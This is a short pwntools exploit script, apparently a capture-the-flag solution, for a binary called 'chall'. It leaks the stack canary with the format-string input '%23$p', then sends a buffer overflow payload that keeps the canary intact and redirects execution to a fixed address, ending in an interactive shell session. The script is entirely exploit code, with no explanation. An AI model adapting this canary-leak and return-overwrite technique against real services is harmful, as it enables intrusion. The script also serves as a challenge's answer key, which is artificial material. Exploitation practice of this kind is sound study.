from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x4009d9
continue
'''.format(**locals())

#Binary filename
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

junk = b"a" * 0x88

p.recvuntil(b"3. Exit the battle \n")
p.sendline(b"2")

p.sendline(b"%23$p")
canary = (int(p.recvline()[2:],16))
log.info("canary = " + hex(canary))

p.recvuntil(b"3. Exit the battle \n")
p.sendline(b"1")

payload = junk + p64(canary) + p64(0) + p64(0x0000000000400659) +p64(0x4008da)
p.sendline(payload)

p.interactive()
